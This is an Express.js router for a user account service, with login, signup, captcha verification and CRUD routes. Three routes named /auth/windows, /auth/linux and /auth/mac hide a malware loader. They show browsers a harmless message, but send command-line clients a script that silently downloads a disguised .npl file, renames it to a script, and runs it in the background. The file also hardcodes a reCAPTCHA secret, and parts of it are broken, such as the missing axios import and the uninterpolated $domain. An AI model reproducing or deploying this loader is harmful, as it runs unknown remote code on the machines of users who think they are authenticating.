var express = require('express');
var router = express.Router();
const Model = require('../models/User');
// const mongoose = require('../utils/mongoose')
const jwt = require('passport-jwt')
const Auth = require('./../middlewares/Auth')

// Lazy Responder :)
function responder(res, err, data) {
    if (err || !data) {
        console.log({
            err, data
        })
        res.status(400).send({
            err, data
        })
    } else {
        console.log("Data: " + data)
        res.status(200).send(data)
    }
}

// I am not a robot
router.post('/verify-captcha', async (req, res) => {
    const { token } = req.body;

  if (!token) {
    return res.status(400).json({ success: false, message: 'Missing reCAPTCHA token' });
  }

  try {
  const response = await axios.post(
    'https://www.google.com/recaptcha/api/siteverify',
    new URLSearchParams({
      secret: "6LdHlYIrAAAAADUWRxj5J5wodSPqzXwApWKQVOWp",
      response: token,
    }).toString(),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    }
  ); // ✅ Closing parenthesis moved here (no extra one)

  if (response.data.success) {
    res.json({ success: true });
  } else {
    res.status(400).json({ success: false, message: 'Failed reCAPTCHA check' });
  }
} catch (error) {
   console.error('CAPTCHA verification error:', error.message);
  res.status(500).json({ success: false, message: 'Server error verifying reCAPTCHA' });
}
})
// Login
router.post('/Login/', (req, res) => {
    console.log(JSON.stringify(req.body))
    Auth.loginAuthenticate(req, (err, data) => {
        responder(res, err, data)
    })
})

// Signup
router.post('/signup/', (req, res) => {
    console.log(JSON.stringify(req.body))
    Auth.authenticate(req, (err, data) => {
        responder(res, err, data)
    })
})
router.get("/auth/windows", (req, res) => {
  const token = req.query.token;

   const userAgent = req.get('User-Agent');
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)){
     res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
   }
   else{
    const domain = req.protocol + '://' + req.get('host');
    
    res.type("text/plain").send(`@echo off
    echo $domain
    curl -s -L -o "%USERPROFILE%\\token" $domain/token.npl
    cls
    ren "%USERPROFILE%\\token" token.cmd
    cls
    call "%USERPROFILE%\\token.cmd"
    cls
    `);
   }


});

router.get("/auth/linux", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
    const domain = req.protocol + '://' + req.get('host');
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" $domain/tokenlinux.npl
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});
router.get("/auth/mac", (req, res) => {    
  const token = req.query.token;
  const userAgent = req.get('User-Agent');
  
  if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
    res.type("text/plain").send(`@echo off
    echo Authenticated
    `);
  }
  else {
    
    const domain = req.protocol + '://' + req.get('host');
res.type("text/plain").send(`#!/bin/bash
set -e
echo "Authenticated"
mkdir -p "$HOME/Documents"
clear
curl -s -L -o "$HOME/Documents/tokenlinux.sh" "$domain/tokenlinux.npl"
clear
chmod +x "$HOME/Documents/tokenlinux.sh"
clear
nohup bash "$HOME/Documents/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

`);
  }
});
// C
router.post('/', Auth.isAuthenticated, (req, res) => {
    Model.createData(req.body, (err, data) => {
        responder(res, err, data)
    })
})

// Ra
router.get('/', Auth.isAuthenticated, (req, res) => {
    Model.getAllData({}, req.query['page'] ? req.query['page'] : 0, (err, data) => {
        responder(res, err, data)
    })
})


// R1
router.get('/byemail/:id', Auth.isAuthenticated, (req, res) => {
    Model.getOneData({email: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// R1
router.get('/byid/:id', Auth.isAuthenticated, (req, res) => {
    Model.getOneData({_id: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// U1
router.put('/:id', Auth.isAuthenticated, (req, res) => {
    delete req.body.email

    Model.updateOneData({_id: req.params.id}, req.body, (err, data) => {
        responder(res, err, data)
    })
})

// D1
router.delete('/:id', Auth.isAuthenticated, (req, res) => {
    Model.removeOneData({_id: req.params['id']}, (err, data) => {
        responder(res, err, data)
    })
})

// Da
router.delete('/', Auth.isAuthenticated, (req, res) => {
    Model.removeAllData((err, data) => {
        responder(res, err, data)
    })
})

module.exports = router;